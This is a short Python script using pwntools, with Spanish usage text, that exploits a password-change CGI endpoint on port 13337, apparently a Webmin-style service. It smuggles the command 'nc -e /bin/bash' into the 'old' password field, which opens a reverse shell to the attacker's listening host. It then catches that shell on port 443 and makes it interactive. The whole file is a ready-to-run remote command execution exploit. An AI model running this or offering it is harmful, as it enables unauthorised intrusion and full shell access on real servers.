#!/usr/bin/python3
from pwn import *
import requests, warnings

warnings.simplefilter("ignore")

if len(sys.argv) < 3:
    print(f"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <rhost> <lhost>\n")
    exit(1)

def cmd():
    target = f"https://{sys.argv[1]}:13337/password_change.cgi"
    data = {"user": "wheel", "pam": "", "expired": "2", "old": f"id|nc -e /bin/bash {sys.argv[2]} 443", "new1": "wheel", "new2": "wheel"}
    headers = {"Content-Type": "application/x-www-form-urlencoded", "Referer": f"https://{sys.argv[1]}:13337/session_login.cgi"}
    cookies = {"redirect": "1", "testing": "1", "sid": "x", "sessiontest": "1"}
    requests.post(target, data=data, headers=headers, cookies=cookies, verify=False)

threading.Thread(target=cmd, args=()).start()
shell = listen(443, timeout=20).wait_for_connection()
shell.sendline(b"export TERM=xterm; cd")
shell.interactive()
